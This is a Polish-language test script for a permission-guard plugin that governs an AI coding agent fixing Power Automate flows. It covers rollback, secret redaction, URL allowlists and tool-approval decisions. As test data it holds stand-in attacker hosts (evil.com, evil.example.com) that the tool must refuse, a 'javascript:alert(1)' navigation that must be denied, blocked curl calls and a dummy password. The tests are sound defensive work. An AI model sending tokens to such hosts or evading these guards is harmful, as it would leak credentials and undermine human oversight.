expect("wycofanie: plan-check", code, None)
accept("FP-2", text)
expect("wycofanie: exec", run_exec("FP-2"), None)
expect("wycofanie: definicja jak kopia", C.leaf_diff(DEFINITION, json.loads(FAKE.clientdata)), [])

print("   nieoczekiwana roznica po zapisie -> przywrocenie kopii")
FAKE.reset()
FAKE.extra_change = True
text = fp_plan(CHANGES).replace("FP-1", "FP-3")
plan_check(text, "FP-3")
accept("FP-3", text)
expect("dodatkowa roznica: krok nieudany", run_exec("FP-3"), 4)
expect("dodatkowa roznica: definicja przywrocona", C.leaf_diff(DEFINITION, json.loads(FAKE.clientdata)), [])
entry = json.loads((WORK / "zgloszenia/FP-3/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
expect("dodatkowa roznica: w dzienniku", (entry.get("przywrocono"), entry.get("nieoczekiwane_roznice")),
       (True, ["properties / definition / triggers / manual / type"]))
expect("dodatkowa roznica: plan zatrzymany", decision(f"{Q} exec FP-3 1"), "deny")
print("   wyjatek przy sprawdzaniu po zapisie -> przywrocenie kopii")


class FlakyRead(FakeDataverse):
    def __call__(self, method, url, body=None, timeout=90, headers=None):
        if method == "GET" and self.patches and len(self.patches) == 1 and not getattr(self, "failed", False):
            self.failed = True
            raise RuntimeError("przerwane polaczenie")
        return super().__call__(method, url, body, timeout, headers)


FLAKY = FlakyRead()
P.http = FLAKY
text = fp_plan(CHANGES).replace("FP-1", "FP-4")
plan_check(text, "FP-4")
accept("FP-4", text)
expect("wyjatek po zapisie: krok nieudany", run_exec("FP-4"), 4)
expect("wyjatek po zapisie: definicja przywrocona", C.leaf_diff(DEFINITION, json.loads(FLAKY.clientdata)), [])
lines = (WORK / "zgloszenia/FP-4/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()
expect("wyjatek po zapisie: wpis przed zapisem i wynik",
       (json.loads(lines[0]).get("etap"), json.loads(lines[-1]).get("przywrocono")), ("zapis-rozpoczety", True))
P.http = FAKE
cfg["flow_patch_dataverse_urls"] = []
C.save_config(cfg)

print("14. Tresc przebiegow (SAS), adresy URL i konsola")
SAS = ("https://00583a33aa23e453b133bb0d0f8fcc.4c.environment.api.powerplatformusercontent.com:443/powerautomate/"
       "flows/x/runs/y/actions/z/contents/ActionOutputs?api-version=2016-06-01&se=2026-11-03T12%3A00%3A00Z&sp=%2Fruns%2Fread&sv=1.0&sig=abc")
expect("SAS: rozpoznany", C.is_run_content_url(SAS), True)
expect("SAS: bez podpisu nie", C.is_run_content_url(SAS.replace("&sig=abc", "")), False)
expect("SAS: obca domena nie", C.is_run_content_url(SAS.replace("powerplatformusercontent.com", "evil.com")), False)
expect("SAS: inny port nie", C.is_run_content_url(SAS.replace(":443/", ":8443/")), False)
expect("SAS: dane logowania w adresie nie", C.is_run_content_url(SAS.replace("https://", "https://u:p@")), False)
expect("SAS: 'assig=' to nie podpis", C.is_run_content_url(SAS.replace("&sig=abc", "&assig=abc")), False)
expect("SAS: podpis wyciety z dziennika", "sig=" in C.redact_url(SAS), False)
expect("SAS: nie dostaje tokenu", C.resource_for_url(SAS), None)
expect("SAS: curl zablokowany", decision(f'curl "{SAS}"'), "deny")
expect("SAS: ppcall get dozwolony", decision(f'{Q} get "{SAS}" --out zgloszenia/INC-1/wyjscie.json'), "allow")
import importlib  # noqa: E402
import urllib.request as _ur  # noqa: E402
P2M = importlib.reload(P)  # prawdziwe http, bez podmiany z punktu 13
sent = {}


class _Resp:
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read(self):
        return b'{"body": "ok"}'


def _urlopen(req, timeout=90):
    sent.update({"url": req.full_url, "headers": dict(req.header_items())})
    return _Resp()


def _no_token(resource):
    raise AssertionError("token pobrany dla SAS")


real_urlopen, P2M.get_token = _ur.urlopen, _no_token
_ur.urlopen = _urlopen
try:
    expect("SAS: odczyt bez tokenu", P2M.http("GET", SAS)[0], 200)
    with contextlib.redirect_stdout(io.StringIO()):
        P2M.cmd_get([SAS])
    last = (TMP / "state/audyt.jsonl").read_text(encoding="utf-8").splitlines()[-1]
    expect("SAS: audyt bez podpisu", "sig=abc" in last, False)
    expect("SAS: brak naglowka Authorization", any(k.lower() == "authorization" for k in sent.get("headers", {})), False)
    try:
        P2M.http("POST", SAS, {})
        expect("SAS: POST odrzucony", "brak bledu", "RuntimeError")
    except RuntimeError:
        expect("SAS: POST odrzucony", "RuntimeError", "RuntimeError")
    P2M.get_token = lambda resource: "t"
    P2M.http("GET", f"{DV}/api/data/v9.2/eko_invoices?$filter=eko_name eq 'Korekta ą'&$top=1")
    expect("URL: spacje i polskie znaki zakodowane", sent.get("url"),
           f"{DV}/api/data/v9.2/eko_invoices?$filter=eko_name%20eq%20'Korekta%20%C4%85'&$top=1")
    expect("URL: juz zakodowany bez zmian", P2M.encode_url("https://a.crm4.dynamics.com/x?$filter=a%20eq%201"),
           "https://a.crm4.dynamics.com/x?$filter=a%20eq%201")
finally:
    _ur.urlopen = real_urlopen

import builtins  # noqa: E402
real_print = builtins.print


def _broken_print(*a, **k):
    raise OSError(22, "Invalid argument")


builtins.print = _broken_print
try:
    P2M.out("Zażółć gęślą jaźń")
    console = "ok"
except OSError:
    console = "OSError"
finally:
    builtins.print = real_print
expect("konsola: OSError przy print nie przerywa ppcall", console, "ok")

print("15. Staly katalog zgloszen (incidents_dir)")
INC = TMP / "dyzur-zgloszenia"
cfg["incidents_dir"] = str(INC)
C.save_config(cfg)
expect("incidents_dir: katalog zgloszenia", C.incident_dir(WORK, "INC-5"), INC / "INC-5")
expect("incidents_dir: --out w stalym katalogu", C.out_path_problem(WORK, str(INC / "INC-5" / "a.json")), None)
expect("incidents_dir: --out w cwd odrzucony", C.out_path_problem(WORK, "zgloszenia/INC-5/a.json") is not None, True)
expect("incidents_dir: wykonanie.jsonl chroniony",
       decision(str(INC / "INC-5" / "wykonanie.jsonl"), "Write"), "deny")
expect("incidents_dir: backup chroniony", decision(str(INC / "INC-5" / "backup" / "k.json"), "Write"), "deny")
r = subprocess.run([BASH, PPCALL, "plan-new", "INC-5"], cwd=WORK, capture_output=True, text=True,
                   encoding="utf-8", errors="replace", env=os.environ, timeout=120)
expect("incidents_dir: plan-new w stalym katalogu", (INC / "INC-5" / "plan.md").exists(), True)
expect("incidents_dir: wzgledna sciezka zgloszona", len(C.config_problems({**C.DEFAULT_CONFIG, "incidents_dir": "zgl"})), 1)
cfg["incidents_dir"] = "wzgledny"
C.save_config(cfg)
expect("incidents_dir: wzgledna sciezka liczona od katalogu sesji", C.incident_dir(WORK, "INC-5"), WORK / "wzgledny" / "INC-5")
cfg["incidents_dir"] = ""
C.save_config(cfg)

print("16. flow-patch: akcja Compose i zmienne (ITS-416)")
P = importlib.reload(P)
WF2 = "444c3e1d-b88f-ef11-8a69-000d3aaf3da8"
TYPE_OLD = "@if(equals(body('X')?['SA_CONSENTS_ELECTRONIC_INVOICE'], true), 'Faktura elektroniczna', 'Faktura papierowa')"
MAIL_OLD = "@{body('Parse_JSON_-_fields.data.form')?['consents']?['electronicInvoiceEmail']}"
MAIL_NEW = "@{coalesce(body('Parse_JSON_-_fields.data.form')?['clientContactPerson']?['email'], '')}"
DEF2 = {"properties": {"definition": {"triggers": {}, "actions": {
    "Agreement_-_Gas_and_electricity": {"type": "Scope", "actions": {
        "Compose_Invoice_Type": {"type": "Compose", "runAfter": {}, "inputs": TYPE_OLD}}},
    "Initialize_variable_-_EmailFaktura": {"type": "InitializeVariable", "runAfter": {},
                                           "inputs": {"variables": [{"name": "EmailFaktura", "type": "string",
                                                                     "value": MAIL_OLD}]}},
    "Set_variable": {"type": "SetVariable", "inputs": {"name": "X", "value": "a"}},
    "Http": {"type": "Http", "inputs": {"method": "GET", "uri": "https://x", "body": "@{x}"}}}}}}
COMPOSE = ["properties", "definition", "actions", "Agreement_-_Gas_and_electricity", "actions", "Compose_Invoice_Type", "inputs"]
VARIABLE = ["properties", "definition", "actions", "Initialize_variable_-_EmailFaktura", "inputs", "variables", "0", "value"]
expect("Compose: cale inputs dozwolone", C.flow_patch_path_problem(COMPOSE), None)
expect("zmienna: variables/0/value dozwolone", C.flow_patch_path_problem(VARIABLE), None)
expect("zmienna: variables/0/name odrzucone",
       C.flow_patch_path_problem(VARIABLE[:-1] + ["name"]) is not None, True)
expect("etykieta Compose", C.flow_patch_label(COMPOSE), "Compose_Invoice_Type: inputs")
expect("get_at z indeksem listy", C.get_at(DEF2, VARIABLE), MAIL_OLD)
copy2 = copy.deepcopy(DEF2)
C.set_at(copy2, VARIABLE, MAIL_NEW)
expect("set_at z indeksem listy", C.leaf_diff(DEF2, copy2), [tuple(VARIABLE)])


def live(step_changes, definition=DEF2):
    wf = {"ismanaged": False, "category": 5, "modifiedon": "2026-10-07T07:21:50Z",
          "clientdata": json.dumps(definition, ensure_ascii=False)}
    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "2026-10-07T07:21:50Z", "zmiany": step_changes}, wf)[0]


expect("Compose na zywo: zgodne", live([{"sciezka": COMPOSE, "bylo": TYPE_OLD, "ma_byc": "Faktura elektroniczna"},
                                        {"sciezka": VARIABLE, "bylo": MAIL_OLD, "ma_byc": MAIL_NEW}]), [])
http_inputs = ["properties", "definition", "actions", "Http", "inputs"]
expect("cale inputs akcji Http odrzucone na zywo",
       any("Compose" in e for e in live([{"sciezka": http_inputs, "bylo": "x", "ma_byc": "y"}])), True)
fake_var = ["properties", "definition", "actions", "Set_variable", "inputs", "variables", "0", "value"]
expect("variables w SetVariable odrzucone na zywo",
       bool(live([{"sciezka": fake_var, "bylo": "a", "ma_byc": "b"}])), True)
expect("SetVariable: inputs/value na zywo",
       live([{"sciezka": ["properties", "definition", "actions", "Set_variable", "inputs", "value"], "bylo": "a",
              "ma_byc": "b"}]), [])

expect("indeks listy: cyfra spoza ASCII odrzucona",
       C.flow_patch_path_problem(VARIABLE[:-2] + ["²", "value"]) is not None, True)
expect("indeks listy: zero wiodace odrzucone", C.flow_patch_path_problem(VARIABLE[:-2] + ["00", "value"]) is not None, True)
try:
    C.get_at({"a": [1]}, ["a", "²"])
    expect("get_at: cyfra spoza ASCII", "brak bledu", "KeyError")
except KeyError:
    expect("get_at: cyfra spoza ASCII", "KeyError", "KeyError")

print("17. Odczyt hurtowy: get --all i ppcall runs")
pages = {
    f"{DV}/api/data/v9.2/workflows?$top=2": {"value": [{"n": 1}, {"n": 2}],
                                             "@odata.nextLink": f"{DV}/api/data/v9.2/workflows?$skiptoken=2"},
    f"{DV}/api/data/v9.2/workflows?$skiptoken=2": {"value": [{"n": 3}]},
    f"{DV}/api/data/v9.2/zly?$top=1": {"value": [{"n": 1}], "@odata.nextLink": "https://evil.example.com/next"},
}
P.http = lambda m, u, b=None, timeout=90, headers=None: (200, json.dumps(pages[u]).encode("utf-8"))
status, body = P.get_all(f"{DV}/api/data/v9.2/workflows?$top=2", 50)
expect("get --all: strony polaczone", (status, len(json.loads(body)["value"]), json.loads(body)["niepelne"]), (200, 3, False))
status, body = P.get_all(f"{DV}/api/data/v9.2/workflows?$top=2", 1)
expect("get --all: limit stron", json.loads(body)["niepelne"], True)
try:
    P.get_all(f"{DV}/api/data/v9.2/zly?$top=1", 50)
    expect("get --all: nastepna strona na inny host", "brak bledu", "RuntimeError")
except RuntimeError:
    expect("get --all: nastepna strona na inny host", "RuntimeError", "RuntimeError")

ENV = "e3a3a7e8-1b2a-e86a-a007-952d0260d158"
FLOW = "5db1ee6c-daa7-62a4-e8fb-f15ec825c682"
RB = f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}/runs"
SAS_OUT = SAS.replace("ActionOutputs", "Out")


def flow_api(m, u, b=None, timeout=90, headers=None):
    if u == f"{RB}?api-version=2016-11-01":
        return 200, json.dumps({"value": [
            {"name": "r3", "properties": {"startTime": "2026-11-02T10:00:00Z", "status": "Succeeded"}},
            {"name": "r2", "properties": {"startTime": "2026-10-23T05:38:00Z", "status": "Failed"}}],
            "nextLink": f"{RB}?api-version=2016-11-01&page=2"}).encode()
    if u == f"{RB}?api-version=2016-11-01&page=2":
        return 200, json.dumps({"value": [
            {"name": "r1", "properties": {"startTime": "2026-10-01T00:00:00Z", "status": "Succeeded"}}]}).encode()
    if u.startswith(f"{RB}/r"):
        return 200, json.dumps({"properties": {"startTime": "x", "status": "Succeeded",
                                               "trigger": {"status": "Succeeded", "inputsLink": {"uri": SAS}},
                                               "actions": {"HTTP": {"status": "Succeeded", "outputsLink": {"uri": SAS_OUT}},
                                                           "Compose": {"status": "Succeeded"}}}}).encode()
    if u == SAS:
        return 200, b'{"body": {"id": "doc-1"}}'
    if u == SAS_OUT:
        return 200, b'{"statusCode": 200}'
    return 404, b"{}"


P.http = flow_api
target = WORK / "zgloszenia/INC-1/przebiegi.jsonl"
with contextlib.redirect_stdout(io.StringIO()):
    P.cmd_runs([ENV, FLOW, "--out", str(target), "--od", "2026-10-15", "--wejscia", "trigger", "--wyjscia", "HTTP"])
rows = [json.loads(l) for l in target.read_text(encoding="utf-8").splitlines()]
expect("runs: filtr --od zatrzymuje na starszych", [r["name"] for r in rows], ["r3", "r2"])
expect("runs: wejscia wyzwalacza", rows[0]["akcje"]["trigger"].get("wejscia"), {"body": {"id": "doc-1"}})
expect("runs: wyjscia akcji", rows[0]["akcje"]["HTTP"].get("wyjscia"), {"statusCode": 200})
expect("runs: bez tresci dla innych akcji", "wyjscia" in rows[0]["akcje"]["Compose"], False)
with contextlib.redirect_stdout(io.StringIO()):
    P.cmd_runs([ENV, FLOW, "--out", str(target)])
expect("runs: bez --akcje tylko lista, z kolejna strona",
       [(r["name"], "akcje" in r) for r in (json.loads(l) for l in target.read_text(encoding="utf-8").splitlines())],
       [("r3", False), ("r2", False), ("r1", False)])
bad_pages = {"next": f"{DV}/api/data/v9.2/accounts", "link": f"{DV}/api/data/v9.2/x"}


def flow_api_bad(m, u, b=None, timeout=90, headers=None):
    if u == f"{RB}?api-version=2016-11-01":
        return 200, json.dumps({"value": [{"name": "r9", "properties": {"startTime": "2026-11-02T10:00:00Z"}}],
                                "nextLink": bad_pages["next"]}).encode()
    if u.startswith(f"{RB}/r9"):
        return 200, json.dumps({"properties": {"actions": {"HTTP": {"outputsLink": {"uri": bad_pages["link"]}}}}}).encode()
    calls.append(u)
    return 200, b'{"value": []}'


calls.clear()
P.http = flow_api_bad
target2 = WORK / "zgloszenia/INC-1/przebiegi2.jsonl"
with contextlib.redirect_stdout(io.StringIO()):
    try:
        P.cmd_runs([ENV, FLOW, "--out", str(target2), "--wyjscia", "HTTP"])
        code = None
    except SystemExit as e:
        code = e.code
expect("runs: nastepna strona na inny adres przerywa", code, 2)
expect("runs: zadne zapytanie poza Flow API i SAS", calls, [])
expect("runs: przerwany odczyt nie zostawia pliku wynikowego", target2.exists(), False)
P.http = flow_api
for label, cmd in [("runs bez --out", f"{Q} runs {ENV} {FLOW}"),
                   ("runs --out poza zgloszeniem", f"{Q} runs {ENV} {FLOW} --out ../x.jsonl"),
                   ("runs --out do wykonanie.jsonl", f"{Q} runs {ENV} {FLOW} --out zgloszenia/INC-1/wykonanie.jsonl")]:
    expect(label, decision(cmd), "allow" if label == "runs bez --out" else "deny")
r = ppcall("runs", ENV, FLOW)
expect("runs bez --out: ppcall odmawia", r.returncode, 1)

print("18. Weryfikacja po naprawie (ppcall verify)")
VPLAN = PLAN.replace("INC-1", "VER-1").replace(
    "Odczyt stanu flow zwraca Started, a najbliższy przebieg o 14:00 kończy się statusem Succeeded.",
    "Odczyt stanu flow zwraca Started.\n```json\n"
    '[{"opis": "Flow wlaczony", "url": "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/'
    'environments/env1/flows/abc?api-version=2016-11-01", "sciezka": ["properties", "state"], '
    '"oczekiwane": "Started"}]\n```')
vdir = WORK / "zgloszenia/VER-1"
vdir.mkdir(parents=True, exist_ok=True)
(vdir / "plan.md").write_text(VPLAN, encoding="utf-8")
expect("verify: plan z odczytami przechodzi walidacje", C.check_plan(VPLAN)[0], [])
expect("verify: odczyt z obcym hostem odrzucony",
       bool(C.check_plan(VPLAN.replace("https://api.flow.microsoft.com/providers", "https://evil.example.com/p"))[0]), True)
state = {"v": "Started"}
P.http = lambda m, u, b=None, timeout=90, headers=None: (200, json.dumps({"properties": {"state": state["v"]}}).encode())


def verify_code(incident="VER-1"):
    with contextlib.redirect_stdout(io.StringIO()):
        try:
            P.cmd_verify([incident])
        except SystemExit as e:
            return e.code
    return None


expect("verify: plan bez akceptacji odrzucony", verify_code(), 3)
(vdir / "wykonanie.jsonl").write_text(json.dumps({"krok": 1, "skrot_planu": C.plan_hash(VPLAN), "sukces": True}) + "\n",
                                      encoding="utf-8")
with contextlib.redirect_stdout(io.StringIO()):
    try:
        P.cmd_verify(["VER-1"])
        code = None
    except SystemExit as e:
        code = e.code
expect("verify: zgodny stan", code, None)
state["v"] = "Stopped"
with contextlib.redirect_stdout(io.StringIO()):
    try:
        P.cmd_verify(["VER-1"])
        code = None
    except SystemExit as e:
        code = e.code
expect("verify: niezgodny stan", code, 5)
vlog = [json.loads(l) for l in (vdir / "weryfikacja.jsonl").read_text(encoding="utf-8").splitlines()]
expect("verify: dziennik", [v["ok"] for v in vlog], [True, False])
expect("verify: dozwolone bez akceptacji", decision(f"{Q} verify VER-1"), "allow")
expect("verify: zapis do weryfikacja.jsonl zablokowany", decision(str(vdir / "weryfikacja.jsonl"), "Write"), "deny")
(vdir / "plan.md").write_text(VPLAN.replace('"oczekiwane": "Started"', '"status": 200'), encoding="utf-8")
expect("verify: zmienione odczyty po akceptacji odrzucone", verify_code(), 3)
(vdir / "plan.md").write_text(VPLAN, encoding="utf-8")
expect("verify: blok ``` json (zly zapis) odrzucony", bool(C.check_plan(VPLAN.replace("```json\n[", "``` JSON\n[", 1))[0]), True)
expect("verify: zakomentowany blok nie jest wykonywany",
       C.parse_checks(VPLAN.replace("```json\n[", "<!-- ```json\n[", 1).replace("]\n```", "]\n``` -->", 1)), ([], []))
expect("verify: --out do weryfikacja.jsonl zablokowany",
       decision(f'{Q} get "{DV}/api/data/v9.2/WhoAmI" --out zgloszenia/VER-1/weryfikacja.jsonl'), "deny")

print("19. Salesbook: API (dane logowania z flow) i odczyt plikow")
P = importlib.reload(P)
SB_API = "https://ekov-api.salesbook-ent.com/api/v1"
SB_ACTION = "HTTP_-_Get_All_Filles_Connected_With_ID"
SB_DEF = {"properties": {"definition": {"actions": {"Condition_for_agreements": {"type": "If", "actions": {}, "else": {
    "actions": {SB_ACTION: {"type": "Http", "inputs": {"method": "GET", "uri": f"{SB_API}/documents/@{{x}}/files",
                                                       "authentication": {"type": "Basic", "username": "ekov",
                                                                          "password": "tajne-haslo"}}}}}}}}}}
cfg = C.load_config()
expect("Salesbook wylaczony bez ustawien", C.salesbook_auth_source(cfg.get("salesbook_auth_flow") or ""), None)
cfg.update({"salesbook_api_url": SB_API, "salesbook_auth_flow": f"{DV}|{WF2}|{SB_ACTION}"})
C.save_config(cfg)
sb_cfg = {**C.DEFAULT_CONFIG, "salesbook_api_url": SB_API, "salesbook_auth_flow": f"{DV}|{WF2}|{SB_ACTION}"}
expect("config_problems: poprawne ustawienia Salesbooka", C.config_problems(sb_cfg), [])
expect("config_problems: zly format zrodla",
       len(C.config_problems({**sb_cfg, "salesbook_auth_flow": "https://evil.example.com|x|y"})), 1)
expect("config_problems: obcy host API",
       len(C.config_problems({**sb_cfg, "salesbook_api_url": "https://evil.example.com/api"})), 1)

sent_sb, opened = [], []


class _SbResp(_Resp):
    def read(self):
        return b'{"data": {"files": []}}'


class _Opener:
    def __init__(self, handlers):
        self.handlers = handlers

    def open(self, req, timeout=90):
        sent_sb.append({"url": req.full_url, "headers": dict(req.header_items()), "method": req.get_method(),
                        "no_redirect": any(h is P._NoRedirect for h in self.handlers)})
        return _SbResp()


def _dv_urlopen(req, timeout=90):
    opened.append(req.full_url)

    class R(_Resp):
        def read(self):
            return json.dumps({"clientdata": json.dumps(SB_DEF)}).encode("utf-8")
    return R()


real_open, real_build = _ur.urlopen, _ur.build_opener
_ur.urlopen, _ur.build_opener = _dv_urlopen, lambda *h: _Opener(h)
P.get_token = lambda resource: "t"
try:
    P.http("GET", f"{SB_API}/documents/abc/files")
    auth = sent_sb[-1]["headers"].get("Authorization", "")
    expect("Salesbook API: Basic z akcji flow", auth == "Basic " + __import__("base64").b64encode(b"ekov:tajne-haslo").decode(), True)
    expect("Salesbook API: bez przekierowan", sent_sb[-1]["no_redirect"], True)
    expect("Salesbook: dane logowania odczytane z Dataverse", [u for u in opened if f"workflows({WF2})" in u] != [], True)
    P.http("GET", "https://ekov.salesbook-ent.com/signed_document/document/download/file/1?t=2")
    expect("Salesbook plik: bez danych logowania", "Authorization" in sent_sb[-1]["headers"], False)
    P.http("GET", "https://ekov-api.salesbook-ent.com/api/v10/x")
    expect("Salesbook: inna sciezka niz API bez danych logowania", "Authorization" in sent_sb[-1]["headers"], False)
    for label, call in [("Salesbook: POST odrzucony", lambda: P.http("POST", f"{SB_API}/documents", {})),
                        ("Salesbook: dane logowania w adresie", lambda: P.http("GET", "https://u:p@ekov-api.salesbook-ent.com/api/v1/x"))]:
        try:
            call()
            expect(label, "brak bledu", "RuntimeError")
        except RuntimeError:
            expect(label, "RuntimeError", "RuntimeError")
    cfg["salesbook_api_url"] = ""
    C.save_config(cfg)
    try:
        P.http("GET", f"{SB_API}/documents/abc/files")
        expect("Salesbook wylaczony: odmowa", "brak bledu", "RuntimeError")
    except RuntimeError:
        expect("Salesbook wylaczony: odmowa", "RuntimeError", "RuntimeError")
finally:
    _ur.urlopen, _ur.build_opener = real_open, real_build
cfg.update({"salesbook_api_url": "", "salesbook_auth_flow": ""})
C.save_config(cfg)
expect("Salesbook: curl zablokowany", decision(f'curl -u ekov:x "{SB_API}/documents/abc/files"'), "deny")
expect("Salesbook: ppcall get dozwolony", decision(f'{Q} get "{SB_API}/documents/abc/files"'), "allow")
expect("Salesbook: krok planu do API odrzucony",
       bool(C.step_problems({"nr": 1, "opis": "x", "typ": "http", "metoda": "POST", "url": f"{SB_API}/documents"}, 1)), True)

print("20. Hasla w odpowiedziach sa ukrywane")
red = C.redact_secrets({"clientdata": json.dumps(SB_DEF), "list": [{"clientSecret": "s3"}], "name": "x"})
expect("redact: haslo w clientdata", "tajne-haslo" in json.dumps(red), False)
expect("redact: clientSecret w liscie", "s3" in json.dumps(red), False)
expect("redact: reszta bez zmian", (red["name"], json.loads(red["clientdata"])["properties"]["definition"]["actions"]
                                    ["Condition_for_agreements"]["else"]["actions"][SB_ACTION]["inputs"]["authentication"]["username"]),
       ("x", "ekov"))
P.http = lambda m, u, b=None, timeout=90, headers=None: (200, json.dumps({"clientdata": json.dumps(SB_DEF)}).encode())
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    P.cmd_get([f"{DV}/api/data/v9.2/workflows({WF2})?$select=clientdata"])
expect("ppcall get: haslo nie trafia na ekran", "tajne-haslo" in buf.getvalue(), False)
with contextlib.redirect_stdout(io.StringIO()):
    P.cmd_get([f"{DV}/api/data/v9.2/workflows({WF2})?$select=clientdata", "--out", "zgloszenia/INC-1/def.json"])
expect("ppcall get --out: haslo nie trafia do pliku",
       "tajne-haslo" in (WORK / "zgloszenia/INC-1/def.json").read_text(encoding="utf-8"), False)

print("21. Przegladarka: odczyt swobodnie, zmiany za zgoda")


def browser(tool: str, tin: dict) -> str | None:
    r = hook("hook_guard", {"tool_name": tool, "tool_input": tin, "cwd": str(WORK)})
    return r["hookSpecificOutput"]["permissionDecision"] if r else None


for prefix in ("mcp__claude-in-chrome__", "mcp__Claude_Browser__"):
    expect(f"{prefix}navigate", browser(prefix + "navigate", {"url": "https://sb.ekovoltis.pl/"}), None)
    expect(f"{prefix}get_page_text", browser(prefix + "get_page_text", {}), None)
    expect(f"{prefix}zrzut ekranu", browser(prefix + "computer", {"action": "screenshot"}), None)
    expect(f"{prefix}klikniecie", browser(prefix + "computer", {"action": "left_click", "action_summary": "Otwiera dokument"}), "ask")
    expect(f"{prefix}wpisanie tekstu", browser(prefix + "computer", {"action": "type", "text": "x"}), "ask")
    expect(f"{prefix}formularz", browser(prefix + "form_input", {"ref": "ref_1", "value": "x"}), "ask")
    expect(f"{prefix}javascript", browser(prefix + "javascript_tool", {"text": "1"}), "ask")
    expect(f"{prefix}wgrywanie pliku", browser(prefix + "file_upload", {}), "deny")
expect("browser_batch z kliknieciem", browser("mcp__claude-in-chrome__browser_batch", {"actions": [
    {"name": "navigate", "input": {"url": "https://sb.ekovoltis.pl"}},
    {"name": "computer", "input": {"action": "left_click"}}]}), "ask")
expect("browser_batch z wgraniem pliku", browser("mcp__claude-in-chrome__browser_batch", {"actions": [
    {"name": "computer", "input": {"action": "left_click"}}, {"name": "file_upload", "input": {}}]}), "deny")
expect("browser_batch tylko odczyt", browser("mcp__Claude_Browser__browser_batch", {"actions": [
    {"name": "get_page_text", "input": {}}]}), None)

for label, tool, tin, want in [
    ("klikniecie srodkowym", "computer", {"action": "middle_click"}, "ask"),
    ("wcisniecie przycisku myszy", "computer", {"action": "left_mouse_down"}, "ask"),
    ("akcja bez nazwy", "computer", {}, "ask"),
    ("najechanie kursorem", "computer", {"action": "hover"}, None),
    ("upload_image", "upload_image", {}, "deny"),
    ("shortcuts_execute", "shortcuts_execute", {}, "ask"),
    ("nieznane narzedzie", "nowe_narzedzie", {}, "ask"),
    ("navigate javascript:", "navigate", {"url": "javascript:alert(1)"}, "deny"),
    ("navigate data:", "navigate", {"url": "data:text/html,x"}, "deny"),
    ("navigate wstecz", "navigate", {"url": "back"}, None),
    ("navigate bez protokolu", "navigate", {"url": "sb.ekovoltis.pl/dashboard"}, None),
    ("batch: actions nie jest lista", "browser_batch", {"actions": "x"}, "ask"),
    ("batch: element bez nazwy", "browser_batch", {"actions": [{"input": {}}]}, "ask"),
    ("batch: input nie jest obiektem", "browser_batch", {"actions": [{"name": "computer", "input": "x"}]}, "ask"),
    ("batch: nazwa z prefiksem", "browser_batch",
     {"actions": [{"name": "mcp__claude-in-chrome__file_upload", "input": {}}]}, "deny"),
]:
    expect(f"przegladarka: {label}", browser("mcp__claude-in-chrome__" + tool, tin), want)

print("22. Ukrywanie hasel: naglowki, adresy, tekst")
for label, value, secret in [
    ("naglowek Authorization", {"headers": {"Authorization": "Basic ZWtvdjp0YWpuZS1oYXNsbw=="}}, "ZWtvdjp0YWpuZS1oYXNsbw=="),
    ("Basic w tekscie", {"msg": "uzyto Basic ZWtvdjp0YWpuZS1oYXNsbw== do"}, "ZWtvdjp0YWpuZS1oYXNsbw=="),
    ("code= w adresie", {"uri": "https://x.azurewebsites.net/api/f?code=KLUCZ123&a=1"}, "KLUCZ123"),
    ("haslo liczbowe", {"password": 123456}, "123456"),
    ("JSON w tekscie ze spacja", {"s": ' {"pwd": "q-tajne"}'}, "q-tajne"),
    ("token w kluczu", {"access_token": "eyJ0eXAi"}, "eyJ0eXAi"),
]:
    expect(f"redact: {label}", secret in json.dumps(C.redact_secrets(value), ensure_ascii=False), False)
expect("redact: zwykly tekst bez zmian", C.redact_secrets({"opis": "Basic information", "code": "NotSpecified"}),
       {"opis": "Basic information", "code": "NotSpecified"})
expect("redact: adres tresci przebiegu zostaje", C.redact_secrets({"uri": SAS})["uri"], SAS)
expect("redact: odpowiedz tekstowa", P.redact_payload(b"Authorization: Bearer abc.def.ghi123456"),
       b"Authorization: Bearer ***")
expect("redact: plik binarny bez zmian", P.redact_payload(b"%PDF-\xff\xfe"), b"%PDF-\xff\xfe")
unchanged = json.dumps({"a": 1, "b": "x"}, indent=4).encode()
expect("redact: odpowiedz bez hasel bez zmian bajt w bajt", P.redact_payload(unchanged), unchanged)
expect("Read kopii definicji zablokowany",
       hook("hook_guard", {"tool_name": "Read", "tool_input": {"file_path": str(WORK / "zgloszenia/FP-1/backup/x.json")},
                           "cwd": str(WORK)})["hookSpecificOutput"]["permissionDecision"], "deny")
expect("Read notatek dozwolony",
       hook("hook_guard", {"tool_name": "Read", "tool_input": {"file_path": str(WORK / "zgloszenia/FP-1/notatki.md")},
                           "cwd": str(WORK)}), None)

print("23. Tokeny i dane logowania nie ida dalej")
P = importlib.reload(P)
cfg.update({"salesbook_api_url": SB_API, "salesbook_auth_flow": f"{DV}|{WF2}|{SB_ACTION}"})
C.save_config(cfg)
try:
    P.http("GET", f"{SB_API}/../../admin/x")
    expect("Salesbook: sciezka z .. odrzucona", "brak bledu", "RuntimeError")
except RuntimeError:
    expect("Salesbook: sciezka z .. odrzucona", "RuntimeError", "RuntimeError")
cfg.update({"salesbook_api_url": "", "salesbook_auth_flow": ""})
C.save_config(cfg)
captured = {}


def _cap_urlopen(req, timeout=90):
    captured["redirected"] = dict(req.headers)
    captured["unredirected"] = dict(req.unredirected_hdrs)
    return _Resp()


P.get_token = lambda resource: "tok"
real_open = _ur.urlopen
_ur.urlopen = _cap_urlopen
try:
    P.http("GET", f"{DV}/api/data/v9.2/WhoAmI")
finally:
    _ur.urlopen = real_open
expect("token Microsoft nie idzie za przekierowaniem",
       ("Authorization" in captured.get("unredirected", {}), "Authorization" in captured.get("redirected", {})),
       (True, False))

print("24. Plugin uspiony poza praca dyzurna (aktywacja w rozmowie)")
OTHER = TMP / "inny-projekt"
OTHER.mkdir(exist_ok=True)


def guard_in(session, tool, tin, cwd=OTHER):
    r = hook("hook_guard", {"tool_name": tool, "tool_input": tin, "cwd": str(cwd), "session_id": session})
    return r["hookSpecificOutput"]["permissionDecision"] if r else None


S1 = "sesja-elm-1"
expect("uspiony: curl do Dataverse", guard_in(S1, "Bash", {"command": f"curl {DV}/api/data/v9.2/x"}), None)
expect("uspiony: zapis ustawien Claude Code",
